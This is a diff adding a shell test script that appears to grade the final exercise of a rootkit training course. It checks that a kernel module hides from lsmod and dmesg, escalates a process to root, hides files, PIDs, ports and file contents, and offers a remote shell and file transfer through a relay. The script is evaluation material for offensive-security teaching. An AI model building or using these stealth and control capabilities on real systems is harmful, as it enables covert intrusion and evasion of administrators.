@@ -1,0 +1,409 @@
+#!/bin/sh
+# P00: Complete rootkit verification.
+# Tests the full v3 architecture: kernel stealth + Go mTLS agent.
+# Agent commands are sent through the relay server (same as L17-L19).
+# Local mkdir tests verify kernel module independently.
+# shellcheck source=/dev/null
+# shellcheck disable=SC2010 # ls output is the concealment behavior under test.
+. "${RKLINGS_LIB:-/vm/checks/lib.sh}"
+
+begin "P00: Complete rootkit"
+
+assert_exists /root/p00-default-content-verified
+
+ip link set lo up 2>/dev/null
+
+# Build module name from halves so the content filter cannot match it.
+_A=rklin
+_B=gs
+RK="${_A}${_B}"
+
+# -- Agent connection (mTLS via relay) --
+
+_hdr "mTLS agent connection"
+
+wait_agent
+
+if [ -e /rklings/rklings.ko ]; then
+    _fail "standalone module was staged on disk"
+else
+    _ok "no standalone module exists on disk"
+fi
+
+# -- Auto-cloak on load --
+
+_hdr "auto-cloak"
+
+# Temporarily remove content filter so lsmod output is readable.
+mkdir "/tmp/${RK}.u.c.${RK}" 2>/dev/null
+
+if lsmod | grep -q "$RK"; then
+    _fail "module visible in lsmod (auto-cloak failed)"
+else
+    _ok "module auto-cloaked on load"
+fi
+
+mkdir "/tmp/${RK}.h.c.${RK}" 2>/dev/null
+
+if [ -d "/sys/module/${RK}" ]; then
+    _ok "module sysfs entry exists (still functional)"
+else
+    _fail "module sysfs entry missing"
+fi
+
+# -- OPSEC: zero dmesg --
+
+_hdr "dmesg OPSEC"
+
+RK1="rkli"
+RK2="ngs"
+# Disable the content filter while observing the log. Otherwise that filter
+# could hide evidence and falsely prove the independent OPSEC property.
+mkdir "${RK}.u.c.${RK}" 2>/dev/null
+log=$(dmesg 2>/dev/null || true)
+case "$log" in
+    *"${RK1}${RK2}"*)
+        _fail "module name found in dmesg (OPSEC violation)"
+        ;;
+    *)
+        _ok "no module traces in dmesg"
+        ;;
+esac
+mkdir "${RK}.h.c.${RK}" 2>/dev/null
+
+# -- Remote command dispatch (via relay) --
+
+_hdr "command dispatch"
+
+resp=$(send_cmd "PING")
+case "$resp" in
+    PONG*) _ok "PING returned PONG" ;;
+    *) _fail "PING: expected PONG, got: $resp" ;;
+esac
+
+resp=$(send_cmd "STATUS")
+case "$resp" in
+    *PID=*UID=*) _ok "STATUS returned PID and UID" ;;
+    *) _fail "STATUS: expected PID=...UID=..., got: $resp" ;;
+esac
+
+resp=$(send_cmd "INFO")
+case "$resp" in
+    *'"persisted":true'*) _ok "INFO reports default persistence" ;;
+    *) _fail "INFO did not report default persistence: $resp" ;;
+esac
+case "$resp" in
+    *'"file":["rklings"]'*'"content":["rklings"]'* | \
+    *'"content":["rklings"]'*'"file":["rklings"]'*)
+        _ok "INFO reports default file and content concealment" ;;
+    *) _fail "INFO did not report default concealment: $resp" ;;
+esac
+
+# Local mkdir controls and remote INFO must observe the same kernel state.
+mkdir "/tmp/${RK}.u.m" 2>/dev/null
+resp=$(send_cmd "INFO")
+case "$resp" in
+    *'"module_hidden":false'*) _ok "INFO observes local module unhide" ;;
+    *) _fail "INFO kept stale module state after local unhide: $resp" ;;
+esac
+
+mkdir "/tmp/${RK}.u.c.${RK}" 2>/dev/null
+resp=$(send_cmd "INFO")
+case "$resp" in
+    *'"content":["rklings"]'*)
+        _fail "INFO kept stale content target after local unhide" ;;
+    *) _ok "INFO observes local content unhide" ;;
+esac
+if lsmod | grep -q "$RK"; then
+    _ok "module visible after independent module and content unhide"
+else
+    _fail "module still absent after independent module and content unhide"
+fi
+
+mkdir "/tmp/${RK}.h.m" 2>/dev/null
+mkdir "/tmp/${RK}.h.c.${RK}" 2>/dev/null
+resp=$(send_cmd "INFO")
+case "$resp" in
+    *'"module_hidden":true'*'"content":["rklings"]'* | \
+    *'"content":["rklings"]'*'"module_hidden":true'*)
+        _ok "INFO observes restored module and content concealment" ;;
+    *) _fail "INFO did not observe restored concealment: $resp" ;;
+esac
+
+# -- Escalation --
+
+_hdr "escalation"
+
+resp=$(send_cmd "ESCALATE")
+case "$resp" in
+    OK*) _ok "ESCALATE returned OK" ;;
+    *) _fail "ESCALATE: expected OK, got: $resp" ;;
+esac
+
+# -- File hiding --
+
+_hdr "file hiding"
+
+echo "classified" > /tmp/secret.txt
+
+if ls /tmp/ 2>/dev/null | grep -qx "secret.txt"; then
+	_ok "control file visible before hiding"
+else
+	_fail "control file missing before hiding"
+fi
+
+resp=$(send_cmd "HIDE FILE secret.txt")
+case "$resp" in
+    OK*) _ok "HIDE FILE returned OK" ;;
+    *) _fail "HIDE FILE: expected OK, got: $resp" ;;
+esac
+
+sleep 0.2
+if ls /tmp/ 2>/dev/null | grep -q "secret.txt"; then
+    _fail "secret.txt visible in ls after hiding"
+else
+    _ok "secret.txt hidden from ls"
+fi
+
+if [ -f /tmp/secret.txt ]; then
+    _ok "secret.txt still accessible directly"
+else
+    _fail "secret.txt inaccessible (should exist)"
+fi
+
+resp=$(send_cmd "UNHIDE FILE secret.txt")
+case "$resp" in
+    OK*) _ok "UNHIDE FILE returned OK" ;;
+    *) _fail "UNHIDE FILE: expected OK, got: $resp" ;;
+esac
+
+sleep 0.2
+if ls /tmp/ 2>/dev/null | grep -q "secret.txt"; then
+    _ok "secret.txt visible after unhide"
+else
+    _fail "secret.txt still hidden after unhide"
+fi
+
+rm -f /tmp/secret.txt
+
+# -- PID hiding --
+
+_hdr "PID hiding"
+
+setpriv --reuid=1000 --regid=1000 --clear-groups sleep 3600 &
+sleeper=$!
+
+if ps -p "$sleeper" -o pid= | grep -q '[0-9]'; then
+	_ok "control process visible before hiding"
+else
+	_fail "control process missing before hiding"
+fi
+
+resp=$(send_cmd "ESCALATE $sleeper")
+case "$resp" in
+    OK*) _ok "targeted ESCALATE returned OK" ;;
+    *) _fail "targeted ESCALATE: expected OK, got: $resp" ;;
+esac
+if [ "$(awk '/^Uid:/ { print $2 }' "/proc/$sleeper/status")" = 0 ]; then
+    _ok "targeted ESCALATE changed the process UID"
+else
+    _fail "targeted ESCALATE did not change the process UID"
+fi
+
+resp=$(send_cmd "HIDE PID $sleeper")
+case "$resp" in
+    OK*) _ok "HIDE PID returned OK" ;;
+    *) _fail "HIDE PID: expected OK, got: $resp" ;;
+esac
+
+sleep 0.2
+if ps -p "$sleeper" -o pid= | grep -q '[0-9]'; then
+    _fail "PID $sleeper visible in ps after hiding"
+else
+    _ok "PID $sleeper hidden from ps"
+fi
+
+if [ -d "/proc/$sleeper" ]; then
+    _ok "PID $sleeper still exists in /proc"
+else
+    _fail "PID $sleeper disappeared from /proc"
+fi
+
+resp=$(send_cmd "UNHIDE PID $sleeper")
+case "$resp" in
+    OK*) _ok "UNHIDE PID returned OK" ;;
+    *) _fail "UNHIDE PID: expected OK, got: $resp" ;;
+esac
+
+if ps -p "$sleeper" -o pid= | grep -q '[0-9]'; then
+    _ok "PID $sleeper visible after unhide"
+else
+    _fail "PID $sleeper still hidden after unhide"
+fi
+
+kill "$sleeper" 2>/dev/null
+wait "$sleeper" 2>/dev/null
+
+# -- Content hiding --
+
+_hdr "content hiding"
+
+_C=RKTO
+_D=KEN
+CTOKEN="${_C}${_D}"
+
+printf 'normal line one\n%s hidden payload\nnormal line two\n' "$CTOKEN" > /tmp/content_test.txt
+if ! grep -q "$CTOKEN" /tmp/content_test.txt; then
+	_fail "target content not visible before hiding"
+else
+	_ok "target content visible before hiding"
+fi
+
+resp=$(send_cmd "HIDE CONTENT ${CTOKEN}")
+case "$resp" in
+    OK*) _ok "HIDE CONTENT returned OK" ;;
+    *) _fail "HIDE CONTENT: expected OK, got: $resp" ;;
+esac
+sleep 0.2
+actual=$(grep -E '.*' /tmp/content_test.txt)
+case "$actual" in
+    *${CTOKEN}*)
+        _fail "content filter not working"
+        ;;
+    *)
+        _ok "lines containing token filtered from reads"
+        ;;
+esac
+
+resp=$(send_cmd "UNHIDE CONTENT ${CTOKEN}")
+case "$resp" in
+    OK*) _ok "UNHIDE CONTENT returned OK" ;;
+    *) _fail "UNHIDE CONTENT: expected OK, got: $resp" ;;
+esac
+
+actual=$(grep -E '.*' /tmp/content_test.txt)
+case "$actual" in
+    *${CTOKEN}*)
+	_ok "target content visible after unhide"
+        ;;
+    *)
+	_fail "target content still filtered after unhide"
+        ;;
+esac
+
+rm -f /tmp/content_test.txt
+
+# -- Port hiding --
+
+_hdr "port hiding"
+
+nc -l -p 9876 > /dev/null 2>&1 &
+nc_pid=$!
+sleep 0.5
+
+if cat /proc/net/tcp /proc/net/tcp6 2>/dev/null | awk '{print $2}' | grep -qi "$(printf '%04X' 9876)"; then
+	_ok "control port visible before hiding"
+else
+	_fail "control port missing before hiding"
+fi
+if ss -ltnH 'sport = :9876' | grep -q .; then
+	_ok "control port visible through sock_diag before hiding"
+else
+	_fail "control port missing from ss before hiding"
+fi
+
+resp=$(send_cmd "HIDE PORT 9876")
+case "$resp" in
+    OK*) _ok "HIDE PORT returned OK" ;;
+    *) _fail "HIDE PORT: expected OK, got: $resp" ;;
+esac
+
+sleep 0.2
+if cat /proc/net/tcp /proc/net/tcp6 2>/dev/null | awk '{print $2}' | grep -qi "$(printf '%04X' 9876)"; then
+    _fail "port 9876 visible in /proc/net/tcp after hiding"
+else
+    _ok "port 9876 hidden from /proc/net/tcp"
+fi
+if ss -ltnH 'sport = :9876' | grep -q .; then
+    _fail "port 9876 visible through sock_diag after hiding"
+else
+    _ok "port 9876 hidden from ss"
+fi
+
+resp=$(send_cmd "UNHIDE PORT 9876")
+case "$resp" in
+    OK*) _ok "UNHIDE PORT returned OK" ;;
+    *) _fail "UNHIDE PORT: expected OK, got: $resp" ;;
+esac
+
+sleep 0.2
+if grep -q ':2694 ' /proc/net/tcp &&
+   ss -ltnH 'sport = :9876' | grep -q .; then
+    _ok "port 9876 visible through procfs and sock_diag after unhide"
+else
+    _fail "port 9876 still hidden after unhide"
+fi
+
+kill "$nc_pid" 2>/dev/null
+wait "$nc_pid" 2>/dev/null
+
+# -- Remote shell --
+
+_hdr "remote shell"
+
+resp=$(send_cmd "SHELL id")
+case "$resp" in
+    *uid=*) _ok "SHELL id returned uid info" ;;
+    *) _fail "SHELL id: expected uid=..., got: $resp" ;;
+esac
+
+resp=$(send_cmd "SHELL echo hello world")
+case "$resp" in
+    *"hello world"*) _ok "SHELL echo works with spaces" ;;
+    *) _fail "SHELL echo: expected 'hello world', got: $resp" ;;
+esac
+
+# -- File download --
+
+_hdr "file transfer"
+
+echo "test-download-content" > /tmp/dl_test.txt
+resp=$(send_download "/tmp/dl_test.txt")
+case "$resp" in
+    *"test-download-content"*) _ok "DOWNLOAD returned file content" ;;
+    *) _fail "DOWNLOAD: expected file content, got: $resp" ;;
+esac
+
+size=$(send_download_size "/tmp/dl_test.txt")
+if [ "$size" = "22" ]; then
+    _ok "DOWNLOAD size correct (22 bytes)"
+else
+    _fail "DOWNLOAD size: expected 22, got: $size"
+fi
+
+rm -f /tmp/dl_test.txt
+
+# -- File upload --
+
+send_upload "/tmp/ul_test.txt" "uploaded-data"
+if [ -f /tmp/ul_test.txt ]; then
+    actual=$(cat /tmp/ul_test.txt)
+    case "$actual" in
+        *"uploaded-data"*) _ok "UPLOAD wrote correct content" ;;
+        *) _fail "UPLOAD: wrong content: $actual" ;;
+    esac
+else
+    _fail "UPLOAD: file not created"
+fi
+
+rm -f /tmp/ul_test.txt
+
+# -- Clean unload --
+
+_hdr "clean unload"
+
+mkdir "/tmp/${RK}.u.m" 2>/dev/null
+unload "$RK"
+assert_absent "/sys/module/$RK"
+
+summary
